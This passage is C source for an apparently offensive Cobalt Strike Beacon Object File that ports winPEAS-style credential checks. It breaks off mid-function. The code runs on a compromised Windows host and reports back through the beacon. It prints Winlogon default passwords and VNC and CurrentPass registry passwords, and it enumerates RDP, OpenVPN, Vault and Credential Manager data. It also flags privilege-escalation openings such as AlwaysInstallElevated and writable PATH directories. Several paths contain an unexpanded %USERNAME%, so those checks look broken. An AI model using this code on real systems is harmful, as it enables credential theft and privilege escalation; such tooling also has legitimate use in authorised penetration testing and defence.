// ============================================================================
// WINDOWS CREDENTIALS CHECKS
// ============================================================================

#include "winpeas.h"

void CheckAlwaysInstallElevated(void) {
    BeaconPrintf(CALLBACK_OUTPUT, "\n========================================\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] ALWAYS INSTALL ELEVATED CHECK\n");
    BeaconPrintf(CALLBACK_OUTPUT, "========================================\n");
    
    HKEY hKey;
    DWORD alwaysInstallElevated = 0;
    DWORD bufferSize = sizeof(DWORD);
    const char* subkeys[] = {
        "HKEY_CURRENT_USER",
        "HKEY_LOCAL_MACHINE"
    };

    for (int i = 0; i < 2; i++) {
        if (ADVAPI32$RegOpenKeyExA((i == 0) ? HKEY_CURRENT_USER : HKEY_LOCAL_MACHINE,
            "Software\\Policies\\Microsoft\\Windows\\Installer",
            0,
            KEY_QUERY_VALUE,
            &hKey) == ERROR_SUCCESS) {

            if (ADVAPI32$RegQueryValueExA(hKey,
                "AlwaysInstallElevated",
                NULL,
                NULL,
                (LPBYTE)&alwaysInstallElevated,
                &bufferSize) == ERROR_SUCCESS) {

                if (alwaysInstallElevated == 1) {
                    BeaconPrintf(CALLBACK_OUTPUT, "[ALWAYS_INSTALL_ELEVATED][%s] VULNERABLE - Always Install Elevated is enabled\n", subkeys[i]);
                }
                else {
                    BeaconPrintf(CALLBACK_OUTPUT, "[ALWAYS_INSTALL_ELEVATED][%s] Not vulnerable\n", subkeys[i]);
                }
            }
            else {
                BeaconPrintf(CALLBACK_OUTPUT, "[ALWAYS_INSTALL_ELEVATED][%s] Unable to query AlwaysInstallElevated value\n", subkeys[i]);
            }
            ADVAPI32$RegCloseKey(hKey);
        }
        else {
            BeaconPrintf(CALLBACK_OUTPUT, "[ALWAYS_INSTALL_ELEVATED][%s] Registry key does not exist\n", subkeys[i]);
        }
    }
}

void CheckRegistrySecrets(void) {
    BeaconPrintf(CALLBACK_OUTPUT, "\n========================================\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] REGISTRY SECRETS CHECK\n");
    BeaconPrintf(CALLBACK_OUTPUT, "========================================\n");
    
    HKEY hKey;
    char valueData[1024];
    DWORD valueSize = sizeof(valueData);
    
    // Check Winlogon AutoAdminLogon
    if (ADVAPI32$RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        if (ADVAPI32$RegQueryValueExA(hKey, "AutoAdminLogon", NULL, NULL, (LPBYTE)valueData, &valueSize) == ERROR_SUCCESS) {
            BeaconPrintf(CALLBACK_OUTPUT, "[REGISTRY_SECRETS] AutoAdminLogon value: %s\n", valueData);
        }
        valueSize = sizeof(valueData);
        if (ADVAPI32$RegQueryValueExA(hKey, "DefaultUserName", NULL, NULL, (LPBYTE)valueData, &valueSize) == ERROR_SUCCESS) {
            BeaconPrintf(CALLBACK_OUTPUT, "[REGISTRY_SECRETS] DefaultUserName: %s\n", valueData);
        }
        valueSize = sizeof(valueData);
        if (ADVAPI32$RegQueryValueExA(hKey, "DefaultPassword", NULL, NULL, (LPBYTE)valueData, &valueSize) == ERROR_SUCCESS) {
            BeaconPrintf(CALLBACK_OUTPUT, "[REGISTRY_SECRETS] DefaultPassword found: %s\n", valueData);
        }
        ADVAPI32$RegCloseKey(hKey);
    }
    
    BeaconPrintf(CALLBACK_OUTPUT, "[REGISTRY_SECRETS] Registry secrets check completed\n");
}

void CheckRegistryCredentials(void) {
    BeaconPrintf(CALLBACK_OUTPUT, "\n========================================\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] REGISTRY CREDENTIALS CHECK\n");
    BeaconPrintf(CALLBACK_OUTPUT, "========================================\n");
    
    HKEY hKey;
    char valueData[1024] = {0};
    DWORD valueSize = sizeof(valueData);
    int foundCount = 0;
    
    // Check for CurrentPass in ControlSets
    const char* controlSets[] = {
        "SYSTEM\\ControlSet001\\Control",
        "SYSTEM\\ControlSet002\\Control",
        "SYSTEM\\CurrentControlSet\\Control",
        NULL
    };
    
    for (int i = 0; controlSets[i] != NULL; i++) {
        if (ADVAPI32$RegOpenKeyExA(HKEY_LOCAL_MACHINE, controlSets[i], 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            valueSize = sizeof(valueData);
            if (ADVAPI32$RegQueryValueExA(hKey, "CurrentPass", NULL, NULL, (LPBYTE)valueData, &valueSize) == ERROR_SUCCESS) {
                if (MSVCRT$strlen(valueData) > 0) {
                    BeaconPrintf(CALLBACK_OUTPUT, "[REG_CREDS] %s\\CurrentPass: %s\n", controlSets[i], valueData);
                    foundCount++;
                }
            }
            ADVAPI32$RegCloseKey(hKey);
        }
    }
    
    // Check for VNC passwords
    if (ADVAPI32$RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\RealVNC\\WinVNC4", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        valueSize = sizeof(valueData);
        if (ADVAPI32$RegQueryValueExA(hKey, "Password", NULL, NULL, (LPBYTE)valueData, &valueSize) == ERROR_SUCCESS) {
            if (MSVCRT$strlen(valueData) > 0) {
                BeaconPrintf(CALLBACK_OUTPUT, "[REG_CREDS] RealVNC\\WinVNC4\\Password: %s\n", valueData);
                foundCount++;
            }
        }
        ADVAPI32$RegCloseKey(hKey);
    }
    
    // Check for TightVNC
    if (ADVAPI32$RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\TightVNC\\Server", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        valueSize = sizeof(valueData);
        if (ADVAPI32$RegQueryValueExA(hKey, "Password", NULL, NULL, (LPBYTE)valueData, &valueSize) == ERROR_SUCCESS) {
            if (MSVCRT$strlen(valueData) > 0) {
                BeaconPrintf(CALLBACK_OUTPUT, "[REG_CREDS] TightVNC\\Server\\Password: %s\n", valueData);
                foundCount++;
            }
        }
        ADVAPI32$RegCloseKey(hKey);
    }
    
    // Check for WinVNC3
    if (ADVAPI32$RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\ORL\\WinVNC3", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        valueSize = sizeof(valueData);
        if (ADVAPI32$RegQueryValueExA(hKey, "Password", NULL, NULL, (LPBYTE)valueData, &valueSize) == ERROR_SUCCESS) {
            if (MSVCRT$strlen(valueData) > 0) {
                BeaconPrintf(CALLBACK_OUTPUT, "[REG_CREDS] ORL\\WinVNC3\\Password: %s\n", valueData);
                foundCount++;
            }
        }
        ADVAPI32$RegCloseKey(hKey);
    }
    
    // Check for SNMP community strings
    if (ADVAPI32$RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\SNMP", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "[REG_CREDS] SNMP service found - check Parameters\\ValidCommunities for community strings\n");
        ADVAPI32$RegCloseKey(hKey);
    }
    
    if (foundCount == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[REG_CREDS] No obvious credentials found in common registry locations\n");
        BeaconPrintf(CALLBACK_OUTPUT, "[REG_CREDS] Note: Full registry scan for passwords would take significant time\n");
    }
}

void CheckHijackablePaths(void) {
    BeaconPrintf(CALLBACK_OUTPUT, "\n========================================\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] HIJACKABLE PATHS CHECK (DLL Hijacking)\n");
    BeaconPrintf(CALLBACK_OUTPUT, "========================================\n");
    
    HKEY hKey;
    LONG openResult;
    LONG queryResult;
    DWORD valueType;
    char data[1024];
    DWORD dataSize = sizeof(data);
    DWORD len;
    HANDLE hToken, hImpersonatedToken;
    DWORD GenericAccess = FILE_ADD_FILE;
    int NumOfWritablePaths = 0;

    openResult = ADVAPI32$RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment", 0, KEY_READ, &hKey);
    if (openResult != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "[HIJACKABLE_PATH] Error opening registry key: %d\n", openResult);
        return;
    }

    queryResult = ADVAPI32$RegQueryValueExA(hKey, "Path", NULL, &valueType, (LPBYTE)data, &dataSize);
    if (queryResult != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "[HIJACKABLE_PATH] Error querying registry value: %d\n", queryResult);
        ADVAPI32$RegCloseKey(hKey);
        return;
    }

    char* pathToken = MSVCRT$strtok(data, ";");
    while (pathToken != NULL) {
        DWORD attributes = GetFileAttributesA(pathToken);
        if (attributes != INVALID_FILE_ATTRIBUTES && (attributes & FILE_ATTRIBUTE_DIRECTORY)) {
            if (!ADVAPI32$GetFileSecurityA(pathToken, OWNER_SECURITY_INFORMATION | GROUP_SECURITY_INFORMATION | DACL_SECURITY_INFORMATION, NULL, 0, &len) && ERROR_INSUFFICIENT_BUFFER == KERNEL32$GetLastError()) {
                PSECURITY_DESCRIPTOR security = (PSECURITY_DESCRIPTOR)intAlloc(len);
                if (security && ADVAPI32$GetFileSecurityA(pathToken, OWNER_SECURITY_INFORMATION | GROUP_SECURITY_INFORMATION | DACL_SECURITY_INFORMATION, security, len, &len)) {
                    if (ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_DUPLICATE | STANDARD_RIGHTS_READ, &hToken)) {
                        if (ADVAPI32$DuplicateToken(hToken, SecurityImpersonation, &hImpersonatedToken)) {
                            GENERIC_MAPPING mapping = {
                                FILE_GENERIC_READ,
                                FILE_GENERIC_WRITE,
                                FILE_GENERIC_EXECUTE,
                                FILE_ALL_ACCESS
                            };

                            PRIVILEGE_SET privileges = { 0 };
                            DWORD grantedAccess = 0, privilegesLength = sizeof(privileges);
                            BOOL result = FALSE;

                            if (ADVAPI32$AccessCheck(security, hImpersonatedToken, GenericAccess, &mapping, &privileges, &privilegesLength, &grantedAccess, &result)) {
                                if (result) {
                                    BeaconPrintf(CALLBACK_OUTPUT, "[HIJACKABLE_PATH] Found writable directory in PATH: %s\n", pathToken);
                                    NumOfWritablePaths++;
                                }
                            }
                            KERNEL32$CloseHandle(hImpersonatedToken);
                        }
                        KERNEL32$CloseHandle(hToken); 
                    }
                    intFree(security);
                }
            }
        }
        pathToken = MSVCRT$strtok(NULL, ";");
    }
    ADVAPI32$RegCloseKey(hKey);
    BeaconPrintf(CALLBACK_OUTPUT, "[HIJACKABLE_PATH] Found %d writable directories in PATH\n", NumOfWritablePaths);
}

void CheckSavedRDPConnections(void) {
    BeaconPrintf(CALLBACK_OUTPUT, "\n========================================\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] SAVED RDP CONNECTIONS CHECK\n");
    BeaconPrintf(CALLBACK_OUTPUT, "========================================\n");
    
    HKEY hKey;
    char subkeyName[256];
    DWORD subkeyNameSize = sizeof(subkeyName);
    int connectionCount = 0;
    
    // Check HKCU for saved RDP connections
    if (ADVAPI32$RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Terminal Server Client\\Servers", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        DWORD subkeyIndex = 0;
        
        while (ADVAPI32$RegEnumKeyExA(hKey, subkeyIndex++, subkeyName, &subkeyNameSize, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
            HKEY serverKey;
            if (ADVAPI32$RegOpenKeyExA(hKey, subkeyName, 0, KEY_READ, &serverKey) == ERROR_SUCCESS) {
                char usernameHint[256] = {0};
                DWORD valueSize = sizeof(usernameHint);
                
                if (ADVAPI32$RegQueryValueExA(serverKey, "UsernameHint", NULL, NULL, (LPBYTE)usernameHint, &valueSize) == ERROR_SUCCESS) {
                    BeaconPrintf(CALLBACK_OUTPUT, "[RDP] Host: %s, Username Hint: %s\n", subkeyName, usernameHint);
                } else {
                    BeaconPrintf(CALLBACK_OUTPUT, "[RDP] Host: %s\n", subkeyName);
                }
                connectionCount++;
                ADVAPI32$RegCloseKey(serverKey);
            }
            subkeyNameSize = sizeof(subkeyName);
        }
        ADVAPI32$RegCloseKey(hKey);
    }
    
    if (connectionCount == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[RDP] No saved RDP connections found\n");
    }
}

void CheckRDCMan(void) {
    BeaconPrintf(CALLBACK_OUTPUT, "\n========================================\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] RDCMan (REMOTE DESKTOP CONNECTION MANAGER) CHECK\n");
    BeaconPrintf(CALLBACK_OUTPUT, "========================================\n");
    
    // Check for RDCMan.settings file
    char rdcManPath[] = "C:\\Users\\%USERNAME%\\AppData\\Local\\Microsoft\\Remote Desktop Connection Manager\\RDCMan.settings";
    if (GetFileAttributesA(rdcManPath) != INVALID_FILE_ATTRIBUTES) {
        BeaconPrintf(CALLBACK_OUTPUT, "[RDCMan] RDCMan.settings found at: %s\n", rdcManPath);
        BeaconPrintf(CALLBACK_OUTPUT, "[RDCMan] Note: Check for .rdg files referenced in RDCMan.settings\n");
        BeaconPrintf(CALLBACK_OUTPUT, "[RDCMan] Note: .rdg files may contain encrypted credentials\n");
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[RDCMan] RDCMan.settings not found\n");
    }
    
    // Check for .rdg files in common locations
    char rdgPaths[][MAX_PATH] = {
        "C:\\Users\\%USERNAME%\\Documents\\*.rdg",
        "C:\\Users\\%USERNAME%\\Desktop\\*.rdg"
    };
    
    int rdgCount = 0;
    for (int i = 0; i < 2; i++) {
        WIN32_FIND_DATA findData;
        HANDLE hFind = KERNEL32$FindFirstFileA(rdgPaths[i], &findData);
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                    BeaconPrintf(CALLBACK_OUTPUT, "[RDCMan] Found .rdg file: %s\\%s\n", rdgPaths[i], findData.cFileName);
                    rdgCount++;
                    if (rdgCount >= 10) break;
                }
            } while (KERNEL32$FindNextFileA(hFind, &findData) && rdgCount < 10);
            KERNEL32$FindClose(hFind);
        }
    }
    
    if (rdgCount == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[RDCMan] No .rdg files found in common locations\n");
    }
}

void CheckRDPSettings(void) {
    BeaconPrintf(CALLBACK_OUTPUT, "\n========================================\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] RDP SETTINGS CHECK\n");
    BeaconPrintf(CALLBACK_OUTPUT, "========================================\n");
    
    HKEY hKey;
    DWORD valueType = 0;
    DWORD valueSize = sizeof(DWORD);
    DWORD value = 0;
    
    // Check RDP Server Settings
    if (ADVAPI32$RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        // Network Level Authentication
        valueSize = sizeof(DWORD);
        if (ADVAPI32$RegQueryValueExA(hKey, "UserAuthentication", NULL, &valueType, (LPBYTE)&value, &valueSize) == ERROR_SUCCESS) {
            BeaconPrintf(CALLBACK_OUTPUT, "[RDP_SETTINGS] Network Level Authentication: %d\n", value);
        }
        
        // Disable Password Saving
        valueSize = sizeof(DWORD);
        if (ADVAPI32$RegQueryValueExA(hKey, "DisablePasswordSaving", NULL, &valueType, (LPBYTE)&value, &valueSize) == ERROR_SUCCESS) {
            BeaconPrintf(CALLBACK_OUTPUT, "[RDP_SETTINGS] Disable Password Saving: %d\n", value);
        }
        
        // Authentication Level
        valueSize = sizeof(DWORD);
        if (ADVAPI32$RegQueryValueExA(hKey, "AuthenticationLevel", NULL, &valueType, (LPBYTE)&value, &valueSize) == ERROR_SUCCESS) {
            BeaconPrintf(CALLBACK_OUTPUT, "[RDP_SETTINGS] Authentication Level: %d\n", value);
        }
        
        ADVAPI32$RegCloseKey(hKey);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[RDP_SETTINGS] No RDP policy settings found (or access denied)\n");
    }
    
    // Check Restricted Remote Administration
    if (ADVAPI32$RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows\\CredentialsDelegation", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        valueSize = sizeof(DWORD);
        if (ADVAPI32$RegQueryValueExA(hKey, "RestrictedRemoteAdministration", NULL, &valueType, (LPBYTE)&value, &valueSize) == ERROR_SUCCESS) {
            BeaconPrintf(CALLBACK_OUTPUT, "[RDP_SETTINGS] Restricted Remote Administration: %d\n", value);
        }
        ADVAPI32$RegCloseKey(hKey);
    }
}

void CheckRecentCommands(void) {
    BeaconPrintf(CALLBACK_OUTPUT, "\n========================================\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] RECENT COMMANDS CHECK\n");
    BeaconPrintf(CALLBACK_OUTPUT, "========================================\n");
    
    HKEY hKey;
    char valueName[256];
    char valueData[1024];
    DWORD valueNameSize = sizeof(valueName);
    DWORD valueSize = sizeof(valueData);
    int commandCount = 0;
    
    // Check HKCU for recent run commands
    if (ADVAPI32$RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        DWORD valueIndex = 0;
        
        while (ADVAPI32$RegEnumValueA(hKey, valueIndex++, valueName, &valueNameSize, NULL, NULL, NULL, NULL) == ERROR_SUCCESS && commandCount < 20) {
            if (MSVCRT$strcmp(valueName, "MRUList") != 0) {
                valueSize = sizeof(valueData);
                if (ADVAPI32$RegQueryValueExA(hKey, valueName, NULL, NULL, (LPBYTE)valueData, &valueSize) == ERROR_SUCCESS) {
                    BeaconPrintf(CALLBACK_OUTPUT, "[RECENT_CMDS] %s: %s\n", valueName, valueData);
                    commandCount++;
                }
            }
            valueNameSize = sizeof(valueName);
        }
        ADVAPI32$RegCloseKey(hKey);
    }
    
    if (commandCount == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[RECENT_CMDS] No recent commands found\n");
    }
}

void CheckPowerShellHistory(void) {
    BeaconPrintf(CALLBACK_OUTPUT, "\n========================================\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] POWERSHELL HISTORY CHECK\n");
    BeaconPrintf(CALLBACK_OUTPUT, "========================================\n");
    
    // Check for PowerShell transcript files
    char transcriptPath[] = "C:\\transcripts";
    WIN32_FIND_DATA findData;
    char searchPath[MAX_PATH * 2];
    MSVCRT$sprintf(searchPath, "%s\\powershell_transcript*", transcriptPath);
    
    HANDLE hFind = KERNEL32$FindFirstFileA(searchPath, &findData);
    if (hFind != INVALID_HANDLE_VALUE) {
        int transcriptCount = 0;
        do {
            if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                char fullPath[MAX_PATH * 2];
                MSVCRT$sprintf(fullPath, "%s\\%s", transcriptPath, findData.cFileName);
                BeaconPrintf(CALLBACK_OUTPUT, "[PS_HISTORY] Transcript file: %s\n", fullPath);
                transcriptCount++;
                if (transcriptCount >= 10) break;
            }
        } while (KERNEL32$FindNextFileA(hFind, &findData) && transcriptCount < 10);
        KERNEL32$FindClose(hFind);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[PS_HISTORY] No transcript files found in C:\\transcripts\n");
    }
    
    // Check for PSReadline history
    char psHistoryPath[] = "C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt";
    if (GetFileAttributesA(psHistoryPath) != INVALID_FILE_ATTRIBUTES) {
        BeaconPrintf(CALLBACK_OUTPUT, "[PS_HISTORY] PSReadline history found: %s\n", psHistoryPath);
        BeaconPrintf(CALLBACK_OUTPUT, "[PS_HISTORY] Note: May contain sensitive commands and passwords\n");
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[PS_HISTORY] PSReadline history not found\n");
    }
    
    // Check for PowerShell settings
    HKEY hKey;
    if (ADVAPI32$RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "[PS_HISTORY] PowerShell Transcription policy found\n");
        ADVAPI32$RegCloseKey(hKey);
    }
    
    if (ADVAPI32$RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "[PS_HISTORY] PowerShell ScriptBlockLogging policy found\n");
        ADVAPI32$RegCloseKey(hKey);
    }
}

void CheckOpenVPN(void) {
    BeaconPrintf(CALLBACK_OUTPUT, "\n========================================\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] OPENVPN CREDENTIALS CHECK\n");
    BeaconPrintf(CALLBACK_OUTPUT, "========================================\n");
    
    HKEY hKey;
    char configName[256];
    DWORD configNameSize = sizeof(configName);
    int configCount = 0;
    
    // Check for OpenVPN configurations in registry
    if (ADVAPI32$RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\OpenVPN-GUI\\configs", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "[OPENVPN] OpenVPN configurations found\n");
        
        DWORD subkeyIndex = 0;
        while (ADVAPI32$RegEnumKeyExA(hKey, subkeyIndex++, configName, &configNameSize, NULL, NULL, NULL, NULL) == ERROR_SUCCESS && configCount < 10) {
            HKEY configKey;
            char configPath[512];
            MSVCRT$sprintf(configPath, "SOFTWARE\\OpenVPN-GUI\\configs\\%s", configName);
            
            if (ADVAPI32$RegOpenKeyExA(HKEY_CURRENT_USER, configPath, 0, KEY_READ, &configKey) == ERROR_SUCCESS) {
                DWORD valueSize = 0;
                if (ADVAPI32$RegQueryValueExA(configKey, "auth-data", NULL, NULL, NULL, &valueSize) == ERROR_SUCCESS) {
                    BeaconPrintf(CALLBACK_OUTPUT, "[OPENVPN] Config: %s (has auth-data)\n", configName);
                    BeaconPrintf(CALLBACK_OUTPUT, "[OPENVPN] Note: Use DPAPI to decrypt auth-data with entropy\n");
                }
                configCount++;
                ADVAPI32$RegCloseKey(configKey);
            }
            configNameSize = sizeof(configName);
        }
        ADVAPI32$RegCloseKey(hKey);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[OPENVPN] No OpenVPN configurations found (or access denied)\n");
    }
}

void CheckStickyNotes(void) {
    BeaconPrintf(CALLBACK_OUTPUT, "\n========================================\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] STICKY NOTES CHECK\n");
    BeaconPrintf(CALLBACK_OUTPUT, "========================================\n");
    
    // Check for Sticky Notes database
    char stickyNotesPath[] = "C:\\Users\\%USERNAME%\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_*\\LocalState\\plum.sqlite";
    WIN32_FIND_DATA findData;
    
    // First find the package directory
    char packagePath[] = "C:\\Users\\%USERNAME%\\AppData\\Local\\Packages";
    char searchPath[MAX_PATH * 2];
    MSVCRT$sprintf(searchPath, "%s\\Microsoft.MicrosoftStickyNotes_*", packagePath);
    
    HANDLE hFind = KERNEL32$FindFirstFileA(searchPath, &findData);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                char dbPath[MAX_PATH * 2];
                MSVCRT$sprintf(dbPath, "%s\\%s\\LocalState\\plum.sqlite", packagePath, findData.cFileName);
                if (GetFileAttributesA(dbPath) != INVALID_FILE_ATTRIBUTES) {
                    BeaconPrintf(CALLBACK_OUTPUT, "[STICKY_NOTES] Sticky Notes database found: %s\n", dbPath);
                    BeaconPrintf(CALLBACK_OUTPUT, "[STICKY_NOTES] Note: Database may contain credentials in plain text\n");
                    break;
                }
            }
        } while (KERNEL32$FindNextFileA(hFind, &findData));
        KERNEL32$FindClose(hFind);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[STICKY_NOTES] Sticky Notes database not found\n");
    }
}

void CheckWiFiPasswords(void) {
    BeaconPrintf(CALLBACK_OUTPUT, "\n========================================\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] WIFI PASSWORDS CHECK\n");
    BeaconPrintf(CALLBACK_OUTPUT, "========================================\n");
    
    HKEY hKey;
    char profileName[256];
    DWORD profileNameSize = sizeof(profileName);
    int wifiCount = 0;
    
    // Check WiFi profiles in registry
    if (ADVAPI32$RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NetworkList\\Profiles", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        DWORD subkeyIndex = 0;
        
        while (ADVAPI32$RegEnumKeyExA(hKey, subkeyIndex++, profileName, &profileNameSize, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
            HKEY profileKey;
            char profilePath[512];
            MSVCRT$sprintf(profilePath, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NetworkList\\Profiles\\%s", profileName);
            
            if (ADVAPI32$RegOpenKeyExA(HKEY_LOCAL_MACHINE, profilePath, 0, KEY_READ, &profileKey) == ERROR_SUCCESS) {
                char description[256] = {0};
                DWORD valueSize = sizeof(description);
                
                if (ADVAPI32$RegQueryValueExA(profileKey, "Description", NULL, NULL, (LPBYTE)description, &valueSize) == ERROR_SUCCESS) {
                    // Check if it's a WiFi profile (contains "Wi-Fi" or similar)
                    if (SHLWAPI$StrStrIA(description, "Wi-Fi") != NULL || 
                        SHLWAPI$StrStrIA(description, "Wireless") != NULL ||
                        SHLWAPI$StrStrIA(description, "WLAN") != NULL) {
                        BeaconPrintf(CALLBACK_OUTPUT, "[WIFI] Profile: %s\n", description);
                        wifiCount++;
                    }
                }
                ADVAPI32$RegCloseKey(profileKey);
            }
            profileNameSize = sizeof(profileName);
        }
        ADVAPI32$RegCloseKey(hKey);
    }
    
    // Also check in WLAN profiles
    if (ADVAPI32$RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\WlanSvc\\Profiles", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        DWORD subkeyIndex = 0;
        
        while (ADVAPI32$RegEnumKeyExA(hKey, subkeyIndex++, profileName, &profileNameSize, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
            BeaconPrintf(CALLBACK_OUTPUT, "[WIFI] WLAN Profile: %s\n", profileName);
            wifiCount++;
            profileNameSize = sizeof(profileName);
        }
        ADVAPI32$RegCloseKey(hKey);
    }
    
    if (wifiCount == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[WIFI] No WiFi profiles found in registry\n");
        BeaconPrintf(CALLBACK_OUTPUT, "[WIFI] Note: Use 'netsh wlan show profiles' for more details\n");
    }
}

void CheckVaultCredentials(void) {
    BeaconPrintf(CALLBACK_OUTPUT, "\n========================================\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] WINDOWS VAULT CHECK\n");
    BeaconPrintf(CALLBACK_OUTPUT, "========================================\n");
    
    // Check for vault files
    char vaultPaths[][MAX_PATH] = {
        "C:\\Users\\%USERNAME%\\AppData\\Local\\Microsoft\\Vault",
        "C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Vault"
    };
    
    int vaultCount = 0;
    for (int i = 0; i < 2; i++) {
        WIN32_FIND_DATA findData;
        char searchPath[MAX_PATH * 2];
        MSVCRT$sprintf(searchPath, "%s\\*", vaultPaths[i]);
        
        HANDLE hFind = KERNEL32$FindFirstFileA(searchPath, &findData);
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                    if (MSVCRT$strcmp(findData.cFileName, ".") != 0 && 
                        MSVCRT$strcmp(findData.cFileName, "..") != 0) {
                        char fullPath[MAX_PATH * 2];
                        MSVCRT$sprintf(fullPath, "%s\\%s", vaultPaths[i], findData.cFileName);
                        BeaconPrintf(CALLBACK_OUTPUT, "[VAULT] Found vault directory: %s\n", fullPath);
                        vaultCount++;
                    }
                }
            } while (KERNEL32$FindNextFileA(hFind, &findData));
            KERNEL32$FindClose(hFind);
        }
    }
    
    if (vaultCount == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[VAULT] No vault directories found\n");
    }
    
    BeaconPrintf(CALLBACK_OUTPUT, "[VAULT] Note: Use 'vaultcmd /list' or specialized tools for credential extraction\n");
}

void CheckCredentialManager(void) {
    BeaconPrintf(CALLBACK_OUTPUT, "\n========================================\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] CREDENTIAL MANAGER CHECK\n");
    BeaconPrintf(CALLBACK_OUTPUT, "========================================\n");
    
    // Check for credential files in user profile
    char credPaths[][MAX_PATH] = {
        "C:\\Users\\%USERNAME%\\AppData\\Local\\Microsoft\\Credentials",
        "C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Credentials"
    };
    
    int credCount = 0;
    for (int i = 0; i < 2; i++) {
        WIN32_FIND_DATA findData;
        char searchPath[MAX_PATH * 2];
        MSVCRT$sprintf(searchPath, "%s\\*", credPaths[i]);
        
        HANDLE hFind = KERNEL32$FindFirstFileA(searchPath, &findData);
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                    char fullPath[MAX_PATH * 2];
                    MSVCRT$sprintf(fullPath, "%s\\%s", credPaths[i], findData.cFileName);
                    BeaconPrintf(CALLBACK_OUTPUT, "[CRED_MANAGER] Found credential file: %s\n", fullPath);
                    credCount++;
                    if (credCount >= 20) break;
                }
            } while (KERNEL32$FindNextFileA(hFind, &findData) && credCount < 20);
